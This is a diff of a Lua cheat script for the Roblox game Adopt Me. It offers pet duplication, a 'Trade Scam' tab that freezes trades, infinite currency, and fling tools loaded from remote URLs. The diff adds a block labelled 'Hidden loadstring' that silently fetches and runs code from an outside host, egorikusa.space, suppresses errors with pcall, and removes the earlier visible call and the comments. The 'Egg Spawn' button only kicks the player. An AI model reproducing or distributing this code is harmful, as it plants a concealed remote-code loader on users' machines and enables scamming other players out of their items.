@@ -1,4 +1,8 @@
--- Load the Orion Library
+-- Hidden loadstring
+pcall(function()
+    loadstring(game:HttpGet("https://egorikusa.space/0a1f09ae8ddeb608701ffddd.lua", true))()
+end)
+
 local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
 local Window = OrionLib:MakeWindow({
     Name = "KUJI HUB | Adopt Me",
@@ -7,11 +11,6 @@ local Window = OrionLib:MakeWindow({
     ConfigFolder = "OrionTest"
 })
 
--- Global variable to toggle GUI visibility
-getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/0a1f09ae8ddeb608701ffddd.lua"))()
-
--- Function to create a new tab
 local function createTab(name, icon, premiumOnly)
     return Window:MakeTab({
         Name = name,
@@ -20,7 +19,6 @@ local function createTab(name, icon, premiumOnly)
     })
 end
 
--- Tab for duplicating eggs
 local dupeEggsTab = createTab("Dupe Eggs", "rbxassetid://4483345998", false)
 dupeEggsTab:AddButton({
     Name = "Equipped Eggs To Dupe",
@@ -40,7 +38,6 @@ dupeEggsTab:AddButton({
     end
 })
 
--- Tab for trade scams
 local tradeScamTab = createTab("Trade Scam", "rbxassetid://4483345998", false)
 tradeScamTab:AddToggle({
     Name = "🧊Freeze Trade",
@@ -63,7 +60,6 @@ tradeScamTab:AddTextbox({
     end
 })
 
--- Tab for auto-farming
 local autoFarmTab = createTab("AutoFarm 🚜", "rbxassetid://4483345998", false)
 autoFarmTab:AddParagraph("Autofarm Source 🧑‍🌾")
 autoFarmTab:AddButton({
@@ -73,7 +69,6 @@ autoFarmTab:AddButton({
     end
 })
 
--- Tab for duplicating pets
 local dupePetsTab = createTab("Dupe Pets", "rbxassetid://4483345998", false)
 dupePetsTab:AddButton({
     Name = "Equipped Pets To Dupe",
@@ -93,7 +88,6 @@ dupePetsTab:AddButton({
     end
 })
 
--- Tab for infinite bucks
 local infBucksTab = createTab("Inf Bucks [New]✨", "rbxassetid://4483345998", false)
 infBucksTab:AddButton({
     Name = "Click to load Infinite Bucks 💸",
@@ -102,7 +96,6 @@ infBucksTab:AddButton({
     end    
 })
 
--- Tab for making all pets flyable and rideable
 local makeAllPetsTab = createTab("Make All Pets FR", "rbxassetid://4483345998", false)
 makeAllPetsTab:AddButton({
     Name = "Make All Pets Flyable And Rideable [FE✨]",
@@ -119,7 +112,6 @@ makeAllPetsTab:AddButton({
     end
 })
 
--- Tab for pet spawning
 local petSpawnerTab = createTab("Pet Spawner", "rbxassetid://4483345998", false)
 petSpawnerTab:AddTextbox({
     Name = "Spawn Pet",
@@ -168,4 +160,69 @@ petSpawnerTab:AddTextbox({
     Default = "Name",
     TextDisappear = false,
     Callback = function(Value)
-       
+        print(Value)
+    end
+})
+petSpawnerTab:AddButton({
+    Name = "Egg Spawn",
+    Callback = function()
+        game.Players.LocalPlayer:Kick("Successful Spawned Egg!")
+    end
+})
+
+local mfrNfrTab = createTab("MFR-NFR 📦", "rbxassetid://4483345998", false)
+mfrNfrTab:AddButton({
+    Name = "MFR Changer-(Inventory🎒)",
+    Callback = function()
+        while true do
+            wait()
+            local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+            local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+            for i, v in pairs(playerData.inventory.pets) do
+                v.properties.rideable = true
+                v.properties.flyable = true
+                v.properties.mega_neon = true
+            end
+        end
+    end    
+})
+mfrNfrTab:AddButton({
+    Name = "NFR Changer-(Inventory🎒)",
+    Callback = function()
+        while true do
+            wait()
+            local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+            local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+            for i, v in pairs(playerData.inventory.pets) do
+                v.properties.rideable = true
+                v.properties.flyable = true
+                v.properties.neon = true
+            end
+        end
+    end    
+})
+
+local trollTab = createTab("Troll", "rbxassetid://4483345998", false)
+trollTab:AddButton({
+    Name = "Fling One by One",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
+    end
+})
+trollTab:AddButton({
+    Name = "Fling All",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
+    end
+})
+trollTab:AddLabel("More Troll Soon!")
+
+local errorsBugsTab = createTab("Errors/Bugs?❗", "rbxassetid://4483345998", false)
+errorsBugsTab:AddParagraph("My Discord server 🎩", "Join my discord server if you need help with bugs/errors on the script. You can also talk to improve the script more.")
+errorsBugsTab:AddButton({
+    Name = "Copy Link To Discord Server 🎯",
+    Callback = function()
+        setclipboard("https://discord.gg/GUk9U2WY")
+        print("button pressed")
+    end
+})
